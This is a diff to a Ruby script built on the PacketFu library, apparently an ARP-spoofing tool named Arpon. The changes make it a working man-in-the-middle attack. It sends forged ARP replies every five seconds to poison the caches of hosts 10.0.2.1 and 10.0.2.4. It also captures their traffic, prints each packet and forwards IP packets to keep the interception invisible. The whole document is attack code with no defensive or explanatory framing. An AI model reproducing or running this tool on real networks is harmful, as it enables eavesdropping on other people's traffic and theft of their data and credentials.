@@ -29,11 +29,15 @@ require 'packetfu'
 class Arpon 
 	def initialize(iface)
 		@target_list = []
+		@arp_table = {}
 		@iface = PacketFu::Utils.whoami?(:iface => iface)
 	end
 
 	def mac_from_ip(ip)
-		return PacketFu::Utils::arp(ip)
+		if @arp_table[ip] == nil
+			@arp_table[ip] = PacketFu::Utils::arp(ip)
+		end
+		return @arp_table[ip]
 	end
 
 	def set_arp_cache(target_ip, spoofed_ip, spoofed_mac)
@@ -47,26 +51,39 @@ class Arpon
 	end
 
 	def start
-#   		@job = Thread.new do
+		cap = PacketFu::Capture.new(:start => true, :iface => @iface[:iface], :filter => "not host #{@iface[:ip_saddr]} and not arp")
+		@stream = cap.stream
+		Thread.new do
    			loop do
    				@target_list.each do |t|
    					pkt = PacketFu::ARPPacket.new()
    					pkt.eth_saddr = t[:spoofed_mac]
    					pkt.eth_daddr = t[:target_mac]
-   					pkt.arp_saddr_mac = t[:spoofed_mac]
-   					pkt.arp_daddr_mac = t[:target_mac]
+  					pkt.arp_saddr_mac = t[:spoofed_mac]
+  					pkt.arp_daddr_mac = t[:target_mac]
    					pkt.arp_saddr_ip =  t[:spoofed_ip]
    					pkt.arp_daddr_ip = t[:target_ip]
    					pkt.arp_opcode = 2
    					pkt.to_w
    				end
-   				#sleep 5
+   				sleep 5
    			end
-		end
-#	end
-end
+   		end
+	end
 
+	def stream
+		@stream
+	end
+end
 
 a = Arpon.new('eth0')
 a.mitm_between('10.0.2.1', '10.0.2.4')
 a.start
+a.stream.each do |p|
+	pkt = PacketFu::Packet.parse(p)
+	print pkt.inspect
+	if pkt.proto[1] == 'IP' then
+		pkt.eth_daddr = a.mac_from_ip(pkt.ip_daddr) || a.mac_from_ip('10.0.2.1') # GW
+		pkt.to_w
+	end
+end
